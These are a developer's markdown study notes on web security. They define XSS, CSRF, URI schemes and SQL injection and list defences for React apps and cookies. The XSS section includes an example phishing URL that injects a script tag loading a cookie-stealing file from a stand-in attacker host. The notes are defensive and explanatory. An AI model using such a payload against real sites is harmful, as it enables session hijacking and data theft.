# Defs
## **XSS** - Cross-site Scripting
- are a case of 'code injection'

### **DOM-based** cross-site-scripting
- Malicious code interacts with the client only (no server contact)

## **URI scheme**
A __URI scheme__ is the syntax of a URI

Example - Facetime
```
scheme:  facetime://<address>|<MSISDN>|<mobile number>
example: facetime://+19995551234
```

Example - Chrome Extension
```
scheme: chrome-extension://<extensionID>/<pageName>.html
```

- Escape
  - ref: https://en.wikipedia.org/wiki/Escape_character

## UXSS - Universal XSS
- Attacks on the browser itself

## CSRF/XSRF - Cross-site request forgery

## Covert Redirection
- https://en.wikipedia.org/wiki/Phishing#Covert_redirect

## SQL injection
- https://en.wikipedia.org/wiki/SQL_injection

# Security Steps
- clean store on logout
  - one suggestion is to set state to 'undefined' in some global reducer

- refresh tokens? Idea is to not let any one token live for too long

- should we set HttpOnly in the cookie?

- Keep cookie's expiration low to help protect against XSS (so what is low?)

- if accepting HTML input need to use a [HTML sanitization egine](https://en.wikipedia.org/wiki/HTML_sanitization)

# React Specific
- React has automatic escaping built-in but it is limited says [Avoiding XSS in React is Still Hard](https://medium.com/javascript-security/avoiding-xss-in-react-is-still-hard-d2b5c7ad9412)

# Cookies
- Cookies are easily stolen :(
## Corrective Steps
- Tie session cookies to the IP address of the user who originally logged in
- HttpOnly flag (not great but worth setting)




# Resources
[10 Things You Should Know about Tokens](https://auth0.com/blog/ten-things-you-should-know-about-tokens-and-cookies//)

# Reference
- [Cross-site scripting, Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [HTML sanitization, Wikipedia](https://en.wikipedia.org/wiki/HTML_sanitization)


# XSS
- Send email with link to something attractive 'puppies'
- Link is valid search on some website like
```
// Noe the script tag

http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
```
- Unwise email receipent click on link which runs the script and takes cookie
- Attacker uses cookie to login as user and steal data
## Preventative Measures
- sanitize
- redirect invalid requests
- deny simultaneous logins and/or 2 logins from different IP addresses
- don't display full credit card info
- require password re-entry before access to account/sensitive info
- [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)
- Automated tools that remove XSS malicious code (so what are they called?)


# Other good stuff to know
- [Mobile IP](https://en.wikipedia.org/wiki/Mobile_IP)
- [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)
- SameSite cookie parameter (?more info)

